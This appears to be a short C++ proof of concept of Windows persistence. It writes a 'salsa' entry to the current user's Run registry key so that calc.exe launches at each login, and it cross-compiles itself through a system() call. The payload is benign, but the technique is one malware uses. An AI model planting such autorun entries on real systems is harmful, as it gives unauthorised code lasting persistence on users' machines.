#include <windows.h>

#include <string.h>
#include <iostream>
#include <conio.h>

char* tita;
const char* exe;
const char* exe2;

using namespace std;

int main(const char* exe) {
    exe = "calc.exe";
    HKEY hkey = NULL;

    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey,(LPCSTR)"salsa", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegCloseKey(hkey);
    }
    system("x86_64-w64-mingw32-g++ runkeys.cpp   -I/usr/share/mingw-w64/include/  -o runkeys.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -Wmain");
}





